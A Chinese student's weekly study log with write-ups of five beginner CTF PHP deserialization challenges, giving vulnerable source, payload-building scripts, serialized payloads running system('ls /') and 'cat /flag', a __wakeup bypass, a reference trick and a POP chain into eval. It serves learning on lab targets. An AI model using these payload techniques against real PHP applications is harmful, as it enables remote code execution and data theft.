## 本周重点
### 记5道反序列化题（nss）
1.[SWPUCTF 2021 新生赛]ez_unserialize
打开题目看到页面
![9a5f2266dd5cd968bd4de513d342d578.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700058006030-6912e563-c491-4363-b907-8a1822756afe.png#averageHue=%23eae7e6&clientId=u105ed2d3-ade7-4&from=paste&height=350&id=u8de7b2a9&originHeight=438&originWidth=479&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118357&status=done&style=none&taskId=uc0a29ab4-b15f-446c-b9d3-c9a47878ea5&title=&width=383.2)
查看源代码
![5600c471b36cd7c9ca480a7b6309c65b.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700058023988-97a82167-684f-4677-8083-7f21344074ce.png#averageHue=%23fefdfd&clientId=u105ed2d3-ade7-4&from=paste&height=380&id=u9eb15d74&originHeight=475&originWidth=1075&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46795&status=done&style=none&taskId=u31fb7aa6-a1bc-4f99-baca-903f4752d49&title=&width=860)
明示爬虫泄露
![22d58d64be469f639739e2fce2ef39a8.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700058094672-6bce738a-0eec-4d37-be69-1b4767eeb2ba.png#averageHue=%23fcfbfa&clientId=u105ed2d3-ade7-4&from=paste&height=74&id=u4499a0b6&originHeight=92&originWidth=299&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3597&status=done&style=none&taskId=u9efa0b67-48a4-40e5-9bd7-756c6dd0ae9&title=&width=239.2)
得到题目地址
```
 <?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?> 
```
看到echo $flag所以要启动destruct方法，所以我们要销毁类，即直接构造new wllm进入destruct方法中，然后满足条件语句即可得到flag
```
 <?php
class wllm{
    public $admin=admin;
    public $passwd=ctf;
}
$a=new wllm;
echo serialize($a);


?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
NSSCTF{8d00bc78-5af2-4b20-9d2e-4b3a13cf54c0}
```
2.[SWPUCTF 2022 新生赛]1z_unserialize
```
 <?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
 
?>  
```
同样还是destruct方法，然后看到 第12行有$a($this->lly);可知可以用$a给个命令函数来构造命令
```
 <?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt="system";
    public $lly="ls /";
}
$a=new lyh;
echo serialize($a);

nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:4:"ls /";}
bin boot dev etc flag home lib lib64 media mnt opt proc root run run.sh sbin srv sys tmp usr var

 <?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt="system";
    public $lly="cat /flag";
}
$a=new lyh;
echo serialize($a);

nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}
NSSCTF{bbc9e848-6a63-4aab-b681-c90314d16fce}
```
3.[SWPUCTF 2022 新生赛]ez_ez_unserialize
```
 <?php
class X
{
    public $x = __FILE__;
    function __construct($x)
    {
        $this->x = $x;
    }
    function __wakeup()
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()
    {
        highlight_file($this->x);
        //flag is in fllllllag.php
    }
}
if (isset($_REQUEST['x'])) {
    @unserialize($_REQUEST['x']);
} else {
    highlight_file(__FILE__);
}

```
代码审计发现destruct方法下有可以得到flag的条件，给x传参fllllllag.php即可，但是wakeup方法会改变x参数的值，所以要绕过wakeup
:::tips
(1)当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。
标准序列化结果
O:4:"User":2:{s:8:"username";s:4:"wenda";s:8:"password";s:4:"wenda";}
将2改为3 绕过__Wakeup魔法函数
O:4:"User":3:{s:8:"username";s:4:"wenda";s:8:"password";s:4:"wenda";}
(2)使用C绕过
使用C代替O能绕过_wakeup(),但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容
注意：使用C绕过有版本要求
:::
```
 <?php
class X
{
    public $x = "fllllllag.php";
}
$a=new X;
echo serialize($a);

O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
↓
?x=O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}

 <?php $flag="NSSCTF{32b620d4-7623-400b-b17b-2285541c7f45}";
```
4.[UUCTF 2022 新生赛]ez_unser
```
 <?php
show_source(__FILE__);

###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this->a=1;
        $this->b=2;
        $this->c=3;
    }
    public function __wakeup(){
        $this->a='';
    }
    public function __destruct(){
        $this->b=$this->c;
        eval($this->a);
    }
}
$a=$_GET['a'];
if(!preg_match('/test":3/i',$a)){
    die("你输入的不正确！！！搞什么！！");
}
$bbb=unserialize($_GET['a']);
你输入的不正确！！！搞什么！！
```
可以看到destruct方法里有eval，会执行a的值，但是wakeup方法会清除a的值，所以要绕过wakeup方法，但是开头有个过滤，所以我们要用bc来绕过正则
```
 <?php
class test{
    public $a;
    public $b;
    public $c;
}
$a=new test;
$a->a="system('ls /');";
$a->b="/test\":3";
$a->c="/test\":3";
echo serialize($a);

 O:4:"test":3:{s:1:"a";s:15:"system('ls /');";s:1:"b";s:8:"/test":3";s:1:"c";s:8:"/test":3";}
```
绕过了正则但是没有得到想要的结果，看网上wp是按照题目顺序，wakeup把a值清除了，然后给c赋值指令，然后destruct方法会将c值赋给b，然后把a指针b的值来执行eval
```
 <?php
class test{
    public $a;
    public $b;
    public $c;
}
$x=new test();
$x->b=&$x->a;
$x->c="system('ls /');";
echo urlencode(serialize($x));

O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A2%3Bs%3A1%3A%22c%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D
bin boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 

 <?php
class test{
    public $a;
    public $b;
    public $c;
}
$x=new test();
$x->b=&$x->a;
$x->c="system('cat /fffffffffflagafag');";
echo urlencode(serialize($x));

 O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A2%3Bs%3A1%3A%22c%22%3Bs%3A33%3A%22system%28%27cat+%2Ffffffffffflagafag%27%29%3B%22%3B%7D
NSSCTF{This_iS_SO_SO_SO_EASY} 
```
5.[MoeCTF 2021]unserialize
```
 <?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

if(isset($_GET['serialize'])) {
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
} 
```
看到entrance类里有start应该是链子开始，然后_destruct方法会调用不存在的函数helloworld()触发call方法，所以下一步得到springboard类中最后到evil类中给嗯对赋值指令得到flag
```
 <?php
class entrance
{
    public $start;
}
class springboard
{
    public $middle;
}
class evil
{
    public $end;
}
$a=new entrance;
$a->start=new springboard;
$a->start->middle=new evil;
$a->start->middle->end="system('ls /');";
echo serialize($a);

O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:15:"system('ls /');";}}}
bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var 

 <?php
class entrance
{
    public $start;
}
class springboard
{
    public $middle;
}
class evil
{
    public $end;
}
$a=new entrance;
$a->start=new springboard;
$a->start->middle=new evil;
$a->start->middle->end="system('cat /flag');";
echo serialize($a);

O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system('cat /flag');";}}}
NSSCTF{4bd0b51d-f0c1-412d-8d1a-2a1a5b543308} 
```
## 总结
本周期中考试周在考试和学习中夹着，高数感觉有点危险了 ，感觉现在对反序列化链子分析有很大进步，但目前只做了三星的题可能还没上难度，尝试了一下xss注入，打了几关xss lab靶场，对这种注入算是有些理解了，但还是能力太差，hectf的web第一题最后一层黄师傅说是xss注入，但没找到注入点我，还得继续学啊，这次hectf在web方向竟坐大牢了。
![27d90d9a8c5ec86c14405dedaade165d.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1700390156305-960a202c-f5b0-48bf-bea5-fead66188960.png#averageHue=%23a9a48c&clientId=uf7ef146f-871d-4&from=paste&height=273&id=u8856fc37&originHeight=341&originWidth=406&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77417&status=done&style=none&taskId=u637bad80-5dc0-4227-96b4-9ce8c32d070&title=&width=324.8)
